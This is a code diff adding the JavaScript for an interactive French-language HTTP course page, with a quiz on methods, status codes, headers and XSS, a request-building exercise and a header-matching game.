+    explain: "Avec <strong>GET</strong>, les données sont dans l'URL sous forme de <em>query string</em> : <code>?param=valeur</code>. Avec POST, elles sont dans le corps."
+  },
+  {
+    q: "Quelle est la différence entre HTTP 1.0 et HTTP 1.1 concernant TCP ?",
+    opts: [
+      "HTTP 1.1 utilise UDP au lieu de TCP",
+      "HTTP 1.0 permet de garder la connexion ouverte",
+      "HTTP 1.1 permet de garder la connexion ouverte (keep-alive)",
+      "Il n'y a aucune différence"
+    ],
+    correct: 2,
+    explain: "HTTP/1.1 introduit la connexion persistante : plusieurs échanges peuvent se faire sur la même connexion TCP (keep-alive), évitant de recréer une connexion pour chaque ressource."
+  },
+  {
+    q: "Quel code HTTP indique une redirection permanente ?",
+    opts: ["302", "304", "301", "307"],
+    correct: 2,
+    explain: "<strong>301 Moved Permanently</strong> : l'URL a changé définitivement. Le navigateur met à jour ses favoris. 302 est temporaire."
+  },
+  {
+    q: "Quel en-tête le serveur utilise-t-il pour déposer un cookie chez le client ?",
+    opts: ["Cookie:", "Send-Cookie:", "Set-Cookie:", "New-Cookie:"],
+    correct: 2,
+    explain: "<strong>Set-Cookie:</strong> est l'en-tête de réponse qui dépose un cookie chez le client. Le client renvoie ensuite ce cookie via l'en-tête <code>Cookie:</code>."
+  },
+  {
+    q: "Qu'est-ce que le virtual hosting ?",
+    opts: [
+      "Héberger un site sur plusieurs serveurs",
+      "Héberger plusieurs sites sur la même adresse IP grâce à Host:",
+      "Chiffrer les échanges HTTP",
+      "Utiliser un CDN pour distribuer les ressources"
+    ],
+    correct: 1,
+    explain: "Le <strong>virtual hosting</strong> permet d'héberger plusieurs sites sur la même IP. L'en-tête <code>Host:</code> (obligatoire en HTTP/1.1) indique au serveur quel site virtuel est demandé."
+  },
+  {
+    q: "Pourquoi utilise-t-on multipart/form-data comme Content-Type ?",
+    opts: [
+      "Pour les requêtes GET avec paramètres",
+      "Pour les formulaires sans fichiers",
+      "Pour envoyer des fichiers dans un POST",
+      "Pour compresser le corps de la requête"
+    ],
+    correct: 2,
+    explain: "<strong>multipart/form-data</strong> est utilisé quand le formulaire contient un <code>&lt;input type='file'&gt;</code>. Il permet d'envoyer plusieurs parties (texte + fichier binaire) séparées par un <code>boundary</code>."
+  },
+  {
+    q: "Quelle étape précède obligatoirement la connexion TCP lors d'une requête HTTP ?",
+    opts: ["L'envoi de la requête", "La résolution DNS", "La lecture des cookies", "L'authentification"],
+    correct: 1,
+    explain: "La <strong>résolution DNS</strong> convertit le nom de domaine en adresse IP. Sans cette étape, le navigateur ne sait pas à quelle adresse se connecter en TCP."
+  },
+  {
+    q: "Qu'est-ce que la faille XSS ?",
+    opts: [
+      "Une attaque sur le protocole TLS",
+      "L'injection de code SQL dans une base de données",
+      "L'insertion non contrôlée de données dans le HTML, permettant d'exécuter du JS arbitraire",
+      "Une attaque par force brute sur les mots de passe"
+    ],
+    correct: 2,
+    explain: "Le <strong>XSS (Cross-Site Scripting)</strong> exploite un site qui insère sans vérification des données reçues dans son HTML. Si ces données contiennent du JavaScript, il s'exécute dans le navigateur de la victime."
+  },
+  {
+    q: "En HTTP, qu'arrive-t-il si on supprime le cookie de session côté client ?",
+    opts: [
+      "La session est détruite sur le serveur",
+      "Le client n'est plus reconnu mais la session existe toujours sur le serveur",
+      "Le serveur renvoie une erreur 500",
+      "Rien, le serveur retrouve la session automatiquement"
+    ],
+    correct: 1,
+    explain: "Supprimer le cookie signifie que le navigateur ne peut plus envoyer le <code>PHPSESSID</code>. Le serveur ne reconnaît plus le client. Mais les données de session <strong>restent sur le serveur</strong> jusqu'à leur expiration."
+  },
+  {
+    q: "Quel en-tête de réponse permet au client de faire des requêtes conditionnelles ensuite ?",
+    opts: ["Cache-Control", "Expires", "Last-Modified", "ETag-Date"],
+    correct: 2,
+    explain: "<strong>Last-Modified</strong> (réponse) donne la date de dernière modification. Le client peut ensuite envoyer <code>If-Modified-Since</code> avec cette date pour obtenir un <code>304</code> si rien n'a changé."
+  },
+  {
+    q: "Code 403 vs 404 — quelle est la différence ?",
+    opts: [
+      "403 = ressource non trouvée, 404 = accès interdit",
+      "403 = accès interdit (ressource existe), 404 = ressource introuvable",
+      "Ils sont identiques, juste des synonymes",
+      "403 = erreur serveur, 404 = erreur réseau"
+    ],
+    correct: 1,
+    explain: "<strong>403 Forbidden</strong> : la ressource existe mais l'accès est refusé (pas les droits). <strong>404 Not Found</strong> : la ressource n'existe tout simplement pas à cette URL."
+  },
+  {
+    q: "Que contient obligatoirement la première ligne d'une requête HTTP ?",
+    opts: [
+      "Méthode + URL complète + version HTTP",
+      "Méthode + path + version HTTP",
+      "Version HTTP + code d'état + message",
+      "Host + méthode + path"
+    ],
+    correct: 1,
+    explain: "La <strong>ligne de requête</strong> est : <code>MÉTHODE path VERSION</code>. Ex: <code>GET /cours HTTP/1.1</code>. L'URL complète n'y figure pas (le host est dans l'en-tête <code>Host:</code>)."
+  }
+];
+
+let currentQuiz = 0;
+let quizAnswered = [];
+
+function initQuiz() {
+  currentQuiz = 0;
+  quizAnswered = new Array(quizData.length).fill(false);
+  renderQuiz();
+}
+
+function renderQuiz() {
+  const container = document.getElementById('quiz-container');
+  container.innerHTML = '';
+
+  quizData.forEach((q, i) => {
+    const div = document.createElement('div');
+    div.className = 'exercise';
+    div.id = 'quiz-' + i;
+    div.innerHTML = `
+      <div class="exercise-header">
+        <span class="exercise-tag">Q${i+1}</span>
+        <span class="exercise-title">${q.q}</span>
+      </div>
+      <div class="exercise-body">
+        <div class="quiz-options">
+          ${q.opts.map((o, j) => `<button class="quiz-opt" onclick="answerQuiz(${i},${j})">${o}</button>`).join('')}
+        </div>
+        <div class="quiz-feedback" id="qf-${i}"></div>
+        <button class="quiz-next" id="qn-${i}">Continuer ↓</button>
+      </div>
+    `;
+    container.appendChild(div);
+  });
+}
+
+function answerQuiz(qi, ai) {
+  if (quizAnswered[qi]) return;
+  quizAnswered[qi] = true;
+
+  const q = quizData[qi];
+  const opts = document.querySelectorAll(`#quiz-${qi} .quiz-opt`);
+  const fb = document.getElementById('qf-' + qi);
+  const isCorrect = ai === q.correct;
+
+  opts.forEach((o, j) => {
+    o.disabled = true;
+    if (j === q.correct) o.classList.add('correct');
+    else if (j === ai && !isCorrect) o.classList.add('wrong');
+  });
+
+  fb.className = 'quiz-feedback show ' + (isCorrect ? 'good' : 'bad');
+  fb.innerHTML = (isCorrect ? '✓ Correct ! ' : '✗ Incorrect. ') + q.explain;
+
+  const nextBtn = document.getElementById('qn-' + qi);
+  if (qi < quizData.length - 1) {
+    nextBtn.classList.add('show');
+    nextBtn.onclick = () => {
+      document.getElementById('quiz-' + (qi + 1)).scrollIntoView({ behavior: 'smooth', block: 'start' });
+    };
+  }
+
+  trackScore(isCorrect);
+}
+
+initQuiz();
+
+// ─── Request Builder ─────────────────────────────────────
+const reqScenarios = [
+  {
+    title: "Récupérer la page d'accueil de example.com en HTTP/1.1",
+    fields: {
+      method: { label: "Méthode", opts: ["GET", "POST", "HEAD", "PUT"], correct: 0 },
+      path:   { label: "Path", opts: ["/", "/index.html", "http://example.com/", "example.com"], correct: 0 },
+      version:{ label: "Version HTTP", opts: ["HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/3"], correct: 1 },
+      host:   { label: "En-tête Host:", opts: ["example.com", "(absent)", "www", "localhost"], correct: 0 },
+      conn:   { label: "Connection:", opts: ["close", "keep-alive", "(absent)", "upgrade"], correct: 0 },
+    },
+    expected: "GET / HTTP/1.1\nHost: example.com\nConnection: close\n"
+  },
+  {
+    title: "Demander une ressource en vérifiant si elle a changé depuis le 17 Oct 2019",
+    fields: {
+      method: { label: "Méthode", opts: ["GET", "POST", "CACHE", "CHECK"], correct: 0 },
+      path:   { label: "Path", opts: ["/bonjour.html", "/cache/bonjour.html", "?bonjour.html", "bonjour.html"], correct: 0 },
+      version:{ label: "Version HTTP", opts: ["HTTP/1.0", "HTTP/1.1"], correct: 1 },
+      cond:   { label: "En-tête conditionnel", opts: ["If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT", "Last-Modified: Thu, 17 Oct 2019", "Cache-Control: max-age=0", "Expires: Thu, 17 Oct 2019"], correct: 0 },
+    },
+    expected: "GET /bonjour.html HTTP/1.1\nHost: demo.ad-urca.univ-reims.fr\nConnection: close\nIf-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT\n"
+  }
+];
+
+let reqScenarioIdx = 0;
+let reqSelections = {};
+
+function initReqBuilder() {
+  reqScenarioIdx = 0;
+  renderReqBuilder();
+}
+
+function renderReqBuilder() {
+  const s = reqScenarios[reqScenarioIdx];
+  reqSelections = {};
+
+  const container = document.getElementById('req-builder-container');
+  const fieldKeys = Object.keys(s.fields);
+
+  container.innerHTML = `
+    <div class="exercise">
+      <div class="exercise-header">
+        <span class="exercise-tag">Scénario ${reqScenarioIdx+1}/${reqScenarios.length}</span>
+        <span class="exercise-title">${s.title}</span>
+      </div>
+      <div class="exercise-body">
+        <div class="builder-area">
+          <div>
+            ${fieldKeys.map(k => `
+              <div style="margin-bottom:14px;">
+                <div class="builder-label">${s.fields[k].label}</div>
+                <div class="builder-choices" id="bc-${k}">
+                  ${s.fields[k].opts.map((o,i) => `
+                    <div class="builder-choice" onclick="selectReqOpt('${k}',${i},this)">
+                      ${o}
+                    </div>
+                  `).join('')}
+                </div>
+              </div>
+            `).join('')}
+            <button class="builder-check" onclick="checkReqBuilder()">Vérifier la requête</button>
+          </div>
+          <div>
+            <div class="builder-label">Requête assemblée</div>
+            <div class="builder-output" id="req-output"></div>
+            <div class="quiz-feedback" id="req-feedback" style="margin-top:12px;"></div>
+            ${reqScenarioIdx < reqScenarios.length-1 ? `<button class="quiz-next" id="req-next" onclick="nextReqScenario()">Scénario suivant →</button>` : ''}
+          </div>
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+function selectReqOpt(field, idx, el) {
+  const parent = document.getElementById('bc-' + field);
+  parent.querySelectorAll('.builder-choice').forEach(c => c.classList.remove('selected'));
+  el.classList.add('selected');
+  reqSelections[field] = idx;
+  updateReqOutput();
+}
+
+function updateReqOutput() {
+  const s = reqScenarios[reqScenarioIdx];
+  const fieldKeys = Object.keys(s.fields);
+  let lines = [];
+
+  const method  = reqSelections['method']  !== undefined ? s.fields['method'].opts[reqSelections['method']] : '___';
+  const path    = reqSelections['path']    !== undefined ? s.fields['path'].opts[reqSelections['path']] : '___';
+  const version = reqSelections['version'] !== undefined ? s.fields['version'].opts[reqSelections['version']] : '___';
+
+  lines.push(method + ' ' + path + ' ' + version);
+
+  if ('host' in s.fields) {
+    const v = reqSelections['host'] !== undefined ? s.fields['host'].opts[reqSelections['host']] : '___';
+    if (v !== '(absent)') lines.push('Host: ' + v);
+  }
+  if ('conn' in s.fields) {
+    const v = reqSelections['conn'] !== undefined ? s.fields['conn'].opts[reqSelections['conn']] : '___';
+    if (v !== '(absent)') lines.push('Connection: ' + v);
+  }
+  if ('cond' in s.fields) {
+    const v = reqSelections['cond'] !== undefined ? s.fields['cond'].opts[reqSelections['cond']] : '___';
+    lines.push(v);
+  }
+
+  lines.push('');
+  document.getElementById('req-output').textContent = lines.join('\n');
+}
+
+function checkReqBuilder() {
+  const s = reqScenarios[reqScenarioIdx];
+  const fieldKeys = Object.keys(s.fields);
+  let allCorrect = true;
+
+  fieldKeys.forEach(k => {
+    const sel = reqSelections[k];
+    if (sel === undefined || sel !== s.fields[k].correct) allCorrect = false;
+  });
+
+  const fb = document.getElementById('req-feedback');
+  fb.className = 'quiz-feedback show ' + (allCorrect ? 'good' : 'bad');
+  fb.textContent = allCorrect
+    ? '✓ Parfait ! Ta requête est correctement construite.'
+    : '✗ Pas tout à fait — vérifie chaque champ. Certains choix sont incorrects.';
+
+  if (allCorrect) {
+    const nextBtn = document.getElementById('req-next');
+    if (nextBtn) nextBtn.classList.add('show');
+  }
+
+  trackScore(allCorrect);
+}
+
+function nextReqScenario() {
+  reqScenarioIdx++;
+  renderReqBuilder();
+}
+
+// ─── Matching game ────────────────────────────────────────
+const matchPairs = [
+  { header: "Host:", role: "Nom du serveur visé (obligatoire en HTTP/1.1)" },
+  { header: "Set-Cookie:", role: "Dépose un cookie chez le client" },
+  { header: "Last-Modified:", role: "Date de dernière modification de la ressource" },
+  { header: "If-Modified-Since:", role: "Requête conditionnelle pour le cache" },
+  { header: "Content-Type:", role: "Type MIME du corps du message" },
+  { header: "Location:", role: "URL de redirection (réponses 3xx)" },
+  { header: "Connection:", role: "Fermeture ou maintien de la connexion TCP" },
+  { header: "User-Agent:", role: "Identifiant du navigateur client" },
+];
+
+let matchSelected = null;
+let matchedPairs = new Set();
+
+function initMatch() {
+  const shuffledRoles = [...matchPairs.map(p => p.role)].sort(() => Math.random() - .5);
+  const container = document.getElementById('match-container');
+
+  container.innerHTML = `
+    <div class="exercise">
+      <div class="exercise-header">
+        <span class="exercise-tag">Matching</span>
+        <span class="exercise-title">Clique un en-tête, puis sa description</span>
+      </div>
+      <div class="exercise-body">
+        <div class="match-game">
+          <div>
+            <div class="match-col-label">En-têtes HTTP</div>
+            ${matchPairs.map((p, i) => `
+              <div class="match-item" id="mh-${i}" onclick="selectMatchLeft(${i})">${p.header}</div>
+            `).join('')}
+          </div>
+          <div>
+            <div class="match-col-label">Descriptions</div>
+            ${shuffledRoles.map((r, i) => `
+              <div class="match-item" id="mr-${i}" onclick="selectMatchRight(${i},'${r.replace(/'/g,"\\'")}')">
+                ${r}
+              </div>
+            `).join('')}
+          </div>
+        </div>
+        <div class="score-display" style="margin-top:16px;">
+          <span class="score-num" id="match-score">0</span>
+          <span>/ ${matchPairs.length} bonnes associations</span>
+          <button class="btn-reset" onclick="initMatch()">↺ Recommencer</button>
+        </div>
+      </div>
+    </div>
+  `;
+
+  matchSelected = null;
+  matchedPairs = new Set();
+}
+
+function selectMatchLeft(i) {
+  if (matchedPairs.has('h' + i)) return;
+  document.querySelectorAll('.match-item[id^="mh-"]').forEach(el => el.classList.remove('selected'));
+  matchSelected = { side: 'left', idx: i };
+  document.getElementById('mh-' + i).classList.add('selected');
+}
+
+function selectMatchRight(i, role) {
+  if (!matchSelected || matchSelected.side !== 'left') return;
+  const headerIdx = matchSelected.idx;
+  const header = matchPairs[headerIdx].header;
+  const correctRole = matchPairs[headerIdx].role;
+  const isCorrect = role === correctRole;
+
+  const leftEl  = document.getElementById('mh-' + headerIdx);
+  const rightEl = document.getElementById('mr-' + i);
+
+  if (isCorrect) {
+    leftEl.classList.remove('selected');
+    leftEl.classList.add('matched');
+    rightEl.classList.add('matched');
+    matchedPairs.add('h' + headerIdx);
+    const score = matchedPairs.size;
+    document.getElementById('match-score').textContent = score;
+    trackScore(true);
+  } else {
+    rightEl.classList.add('wrong');
+    leftEl.classList.add('wrong');
+    setTimeout(() => {
+      rightEl.classList.remove('wrong');
+      leftEl.classList.remove('wrong', 'selected');
+    }, 700);
+    trackScore(false);
+  }
+  matchSelected = null;
+}
+</script>
+</body>
+</html>
